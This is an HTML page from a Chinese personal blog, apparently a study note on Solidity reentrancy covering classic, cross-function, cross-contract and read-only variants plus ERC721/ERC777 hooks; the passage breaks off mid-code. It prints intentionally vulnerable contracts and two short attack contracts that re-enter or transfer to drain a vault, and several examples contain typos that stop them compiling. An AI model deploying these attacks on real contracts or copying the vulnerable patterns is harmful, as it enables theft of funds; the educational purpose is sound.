@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icons8-autumn-material-filled-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icons8-autumn-material-filled-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="本篇文章，我又重新学习了一下重入漏洞，并且学了一些重入漏洞的进阶问题，如：跨函数重入，跨合约重入以及只读重入。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="重入">
+<meta property="og:url" content="http://example.com/2024/03/30/%E9%87%8D%E5%85%A5/index.html">
+<meta property="og:site_name" content="Q1ngying">
+<meta property="og:description" content="本篇文章，我又重新学习了一下重入漏洞，并且学了一些重入漏洞的进阶问题，如：跨函数重入，跨合约重入以及只读重入。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-03-30T08:09:38.000Z">
+<meta property="article:modified_time" content="2024-03-30T08:12:08.122Z">
+<meta property="article:author" content="Q1ngying">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/03/30/%E9%87%8D%E5%85%A5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>重入 | Q1ngying</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Q1ngying</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">清影的个人站</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/30/%E9%87%8D%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Q1ngying">
+      <meta itemprop="description" content="今朝梦醒与君别，遥盼春风寄相思">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Q1ngying">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          重入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-30 16:09:38 / 修改时间：16:12:08" itemprop="dateCreated datePublished" datetime="2024-03-30T16:09:38+08:00">2024-03-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本篇文章，我又重新学习了一下重入漏洞，并且学了一些重入漏洞的进阶问题，如：跨函数重入，跨合约重入以及只读重入。</p>
+<span id="more"></span>
+
+<h2 id="经典重入问题（Classic-Reentrancy）"><a href="#经典重入问题（Classic-Reentrancy）" class="headerlink" title="经典重入问题（Classic Reentrancy）"></a>经典重入问题（Classic Reentrancy）</h2><p>一个简单的存储合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    error NativeTokenTransferError();</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        (bool sent,) = payable(msg.sender).call&#123;value: balances[msg.sender]&#125;(&quot;&quot;);</span><br><span class="line">        if (!sent) revert NativeTokenTransferError();</span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><code>delete</code> 关键字在Solidity中用于将单个映射条目或变量重置为其类型的默认值。对于引用类型，默认值通常是零值：对于映射，这意味着将特定键的值重置为其类型的默认值。使用 delete 关键字，比直接设置为默认值更节省 gas。</p>
+<p>详细查看：Solidity 关键字</p>
+</blockquote>
+<p>在这里很容易就可以发现问题所在：<strong>在<code>withdraw</code>函数中，有人将资金存入到了金库，然后在 withdraw 的调用中，他没有优先修改存款人的余额</strong></p>
+<p>我们实际上将交易的执行权给任意外部地址时，某个状态已经过时或尚未更新（这种情况下是 msg.sender），因此当我们对 msg.sender 进行调用操作时，我们将调用 msg.sender 的 fallback 函数和 receive 函数，从<strong>本质上是让他们控制执行</strong>。</p>
+<p>接下来我们可以看到可以用于此的具体攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;../IVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackContract &#123;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        IVault(victim).deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        IVault(victim).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        try IVault(victim).withdraw() &#123;&#125; catch &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终，攻击者能够循环提款并取出他们余额的若干倍</strong>。这一切都来自于一个事实：</p>
+<p><strong>在我们将交易的执行权交给任意外部地址时，这个余额是过时的，他们可以执行任意代码。</strong></p>
+<p>解决方法：</p>
+<ul>
+<li>添加一个 <code>nonReentrant</code> 修饰符</li>
+<li>最优解：<strong>在做任何外部调用之前，确保一切已经更新</strong>（这通常被称为：检查-效果-交互模式）</li>
+</ul>
+<p>基本上说，函数应该以这样的一种方式编写：</p>
+<p>在函数开始时，所有的<code>require</code>语句，所有的验证，以确保输入正确。（状态是你希望在函数被调用之前是什么样子的），然后进入交易的所有效果，效果是你是否更新了特定的状态片段，是否会触发了特定的事件等等。然后在完成了所有的状态更新，所有的事件触发这类之后，只有在这时，才能进行外部调用。</p>
+<h2 id="跨函数重入问题（Cross-Function-Reentrancy）"><a href="#跨函数重入问题（Cross-Function-Reentrancy）" class="headerlink" title="跨函数重入问题（Cross-Function Reentrancy）"></a>跨函数重入问题（Cross-Function Reentrancy）</h2><p>漏洞合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// CrossFunctionReentrancy</span><br><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract ValnerableBank &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(msg.value &gt;0, &quot;Deposit amount must be greater than 0&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        uint256 balance = balances[msg.sender];</span><br><span class="line">        require(balance &gt;= amount, &quot;INsufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success, ) = payable(msg.sender).call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Withdrawal failed&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] = balances - amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到：<code>(bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</code>这段对应的函数还是没有遵顼<strong>检查-效果-互动</strong>模式。我们确实在提款是添加了一个<code>nonReentrant</code>，因此攻击者无法重新进入并提取代币，无法实施和上一个相同的简单重入攻击。但是我们确实拥有一些其他的函数可能被重入，特别是这里的<strong>转账函数</strong>，他引起我们注意的原因是因为<strong>他是这里新增的唯一其他函数。这个函数可能会对跨函数重入攻击敏感。</strong>在<code>withdraw()</code>中有一个过时的状态片段，<code>balances</code>。这个合约在发送资产和与<code>msg.sender</code>进行交互之前，还没有交互余额。因此可能发生的情况是：</p>
+<p><strong>我们将交易的执行权交给<code>msg.sender</code>，然后余额被更新为新的余额</strong>。因此，可能发生的情况是：我们将交易的执行权交给<code>msg.sender</code>，然后在余额被更新之前，减去这里缓存的原始余额，减去他们想要提取的金额之前，攻击者可以调用这个转账函数，基本上将一个不应再存在的余额转移到另一个账户，然后余额将会被设置为在这次外部调用前他应该的金额。因此，查看完整的攻击方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// attack</span><br><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.18;</span><br><span class="line"></span><br><span class="line">import &quot;../IVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack2Contract &#123;</span><br><span class="line">    address victim;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _victim, address _owner) &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        IVault(victim).deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        IVault(victim).withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        uint256 balance = IVault(victim).balances(address(this));</span><br><span class="line">        IVault(victim).transfer(owner, balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>首先，调用攻击合约中的<code>withdraw</code>函数提款，然后触发回调函数，回调函数会在调用<code>transfer</code>函数，把刚刚提取的余额转移到另一个地址<code>owner</code>，然后继续执行金库合约中的<code>withdraw</code>函数逻辑，注意这里的代码：<code>balances[msg.sender] = balances - amount;</code>它是直接为<code>balances[msg.sender]</code>赋值，所赋的值计算方式是<code>balances</code>（提款前的余额）减去提款的余额，但是实际上，<code>balances</code>是在调用 <code>transfer</code> 之前的值，也就是说<strong>实际上，虽然我们在回调函数中调用了 <code>transfer</code> 但是，balances 变量并没有受到 <code>transfer</code>的影响（因为 balances 是 withdraw 之前的值），这时候，便实现了凭空为 owner 地址增加了我们 withdraw 出来的数量的余额</strong>，owner 地址凭空获得了在这个银行存储的余额，可以直接取款，成功实现攻击。</p>
+</blockquote>
+<p><strong>所以在考虑重入函数的时候，不要只考虑一个函数，要考虑多个函数是否会被共同利用，当然，还存在跨合约重入利用。</strong></p>
+<h2 id="跨合约重入问题（Cross-Contract-Reentrancy）"><a href="#跨合约重入问题（Cross-Contract-Reentrancy）" class="headerlink" title="跨合约重入问题（Cross-Contract Reentrancy）"></a>跨合约重入问题（Cross-Contract Reentrancy）</h2><p>合约举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">// contract to create and manage swap &quot;requests&quot;</span><br><span class="line"></span><br><span class="line">contract TwoStepSwapManager &#123;</span><br><span class="line">  </span><br><span class="line">    struct Swap &#123;</span><br><span class="line">        address user;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        address[] swapPath;</span><br><span class="line">        bool unwrapNativeToken;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 swapNonce;</span><br><span class="line">    mapping(uint256 =&gt; Swap) pendingSwaps;</span><br><span class="line"></span><br><span class="line">    function createSwap(uint256 _amount, address[] swapPath, bool unwarpNativeToken) external nonReentrant &#123;</span><br><span class="line">        IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);</span><br><span class="line">        pendingSwaps[++swapNonce] = Swap(&#123;</span><br><span class="line">            user: msg.sender,</span><br><span class="line">            amount: _amount,</span><br><span class="line">            swapPath: swapPath,</span><br><span class="line">            unwrapNativeToken: unwrapNativeToken</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelSwap(uint256 _id) external nonReentrant &#123;</span><br><span class="line">        Swap memory swap = pendingSwaps[_id];</span><br><span class="line">        require(swap.user == msg.sender);</span><br><span class="line">        delete pendingSwaps[_id];</span><br><span class="line"></span><br><span class="line">        IERC20(swapPath[0]).safeTransferFrom(swap.user, swap.amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">// contract to execute swaps</span><br><span class="line"></span><br><span class="line">contract TwoStepSwapExecutor &#123;</span><br><span class="line"></span><br><span class="line">    /** </span><br><span class="line">    Logic to set peices etc...</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant &#123;</span><br><span class="line">        Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);</span><br><span class="line">    </span><br><span class="line">        // If a swapPath ends in WETH and unwrapNativeToken == true, sned ether to user</span><br><span class="line">        ISwapper(swapper).swap(swap.user, swap.amount, swap.swapPath, swap.unwarpNativeToken);</span><br><span class="line"></span><br><span class="line">        delete pendingSwaps[_id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面这个例子看起来，所有的函数都加了不可重入修饰符，看起来是没有被重入攻击的地方的，但实际上不是：</p>
+<p>在<code>TwoStepSwapExecutor</code>合约中，<code>delete pendingSwaps[_id];</code>这个状态还是在交换后才更新的。<strong>而这次交换是交易执行的起点</strong>，是由这个执行器合约上的管理者发起的交易的开始。<strong>因此，如果我们从非重入运算符的角度来看这个问题，当管理者调用执行交换（execute swap）时，当这个合约集成<code>ReentrancyGuard</code>合约时，这为这个合约触发一个开关</strong>。因此，现在这个合约中所有的非重入部分都将能够在第二次进入时回滚</p>
+<p>出现跨合约重入问题的原因还是没有使用<strong>检查-效果-交互（check effects interactions）模式</strong>的原因</p>
+<p>实际造成问题的原因是：首先我们先创建一个Swap，然后调用<code>TwoStepSwapExecutor:executeSwap</code>，触发回调函数（接口），然后再在回调函数中调用<code>TwoStepSwapManager:cancelSwap</code>取消Swap（因为这时还没修改效果，即触发这行代码：<code>delete pendingSwaps[_id];</code>）这导致我能能够撤回我们的 ERC20 Token，同时还获取了 Ether。这里成功实现了跨合约重入。</p>
+<h2 id="只读重入问题（Read-Only-Reentrancy）"><a href="#只读重入问题（Read-Only-Reentrancy）" class="headerlink" title="只读重入问题（Read-Only Reentrancy）"></a>只读重入问题（Read-Only Reentrancy）</h2><p>只读重入背后的基本思想也是和上面其他类型的重入问题思想是类似的：在某个效果没有发生，<strong>在外部调用之前，状态没有更新</strong>。</p>
+<p>任何依赖于特定状态的系统，在攻击者可以控制交易时，这个状态被更新，依赖于这个状态的第三方系统将会读取不准确，过时的状态。因此<strong>现在这些第三方系统将因为这些过时的信息而被利用</strong></p>
+<p>只读重入本质上是一种执行跨合约重入性的方式，但是他不是针对一个系统，而是从一个系统到了某个第三方合约系统。</p>
+<p>合约举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract VulnerableBank &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payabele &#123;</span><br><span class="line">        require(msg.value &gt; 0, &quot;Deposit amount must be greater than 0&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Withdrawal amount be greater than 0&quot;);</span><br><span class="line">        require(isAllowedToWithdraw(msg.sender, amount), &quot;Insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Withdrawal failed&quot;);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isAllowedToWithdraw(address user, uint256 am1ount) public view returns (bool) &#123;</span><br><span class="line">        return balances[usre] &gt;= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个合约看起来并不存在重入问题，但是关键在于这里有一个看起来没有害处的<code>view</code>函数。但在我们将执行权交给<code>msg.sender</code>时，他们已经提取了资金，实际上已经取出了 Ether，只是还没有在这个银行合约中的状态中反映出来。因此在<code>msg.sender</code>被调用的时候，对于原始金额是否允许提取的判断将会是真。<strong>这时候，当其他第三方系统与这个<code>isAllowedToWithdraw()</code>函数集成时，他们应该知道他可能以这种方式被操纵。</strong></p>
+<p>重入的根本愿意就是：在触发效果之前，没有先修改状态，使得后续使用的状态都是过时的状态。</p>
+<h2 id="ERC721-ERC777重入问题"><a href="#ERC721-ERC777重入问题" class="headerlink" title="ERC721&amp;ERC777重入问题"></a>ERC721&amp;ERC777重入问题</h2><p>对于 ERC721 的重入性：有一个在 ERC721 接收函数上被调用的接收者，任何 NFT，任何 ERC721 代币，这是在从一个地址向另一个地址安全转账时被调用的。<strong>如果目标地址是一个合约，它实质上会在该地址上调用这个函数</strong></p>
+<p>下面是简单的对于这两个合约的 hook 函数的简要说明：</p>
+<blockquote>
+<h3 id="ERC721"><a href="#ERC721" class="headerlink" title="ERC721"></a>ERC721</h3><p>在ERC721标准中，当一个NFT（非同质化代币）从一个地址转移到另一个地址时，如果接收地址是一个合约，那么这个合约需要实现<code>ERC721Receiver</code>接口。这个接口定义了一个名为<code>onERC721Received</code>的函数，该函数在NFT被安全转移（<code>safeTransferFrom</code>调用）到合约时自动调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;function onERC721Received(</span><br><span class="line">   address operator,</span><br><span class="line">   address from,</span><br><span class="line">   uint256 tokenId,</span><br><span class="line">   bytes calldata data</span><br><span class="line">&gt;) external returns(bytes4);</span><br></pre></td></tr></table></figure>
+
+<p>如果合约希望接收ERC721代币，它必须正确实现这个函数，并返回特定的字节码值<code>bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))</code>，以表明它正确处理了接收的NFT。</p>
+<h3 id="ERC777"><a href="#ERC777" class="headerlink" title="ERC777"></a>ERC777</h3><p>ERC777是另一个代币标准，提供了更多的功能和灵活性，特别是在代币交易的hook上。它定义了发送和接收代币时可以触发的hooks，分别是<code>tokensToSend</code>和<code>tokensReceived</code>。这些hooks允许合约在代币被发送或接收时执行额外的逻辑。</p>
+<ul>
+<li><code>tokensToSend</code>允许代币的发送者在代币被发送之前执行代码。</li>
+<li><code>tokensReceived</code>允许代币的接收者在代币被接收时执行代码。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;function tokensToSend(</span><br><span class="line">   address operator,</span><br><span class="line">   address from,</span><br><span class="line">   address to,</span><br><span class="line">   uint256 amount,</span><br><span class="line">   bytes calldata userData,</span><br><span class="line">   bytes calldata operatorData</span><br><span class="line">&gt;) external;</span><br><span class="line"></span><br><span class="line">&gt;function tokensReceived(</span><br><span class="line">   address operator,</span><br><span class="line">   address from,</span><br><span class="line">   address to,</span><br><span class="line">   uint256 amount,</span><br><span class="line">   bytes calldata userData,</span><br><span class="line">   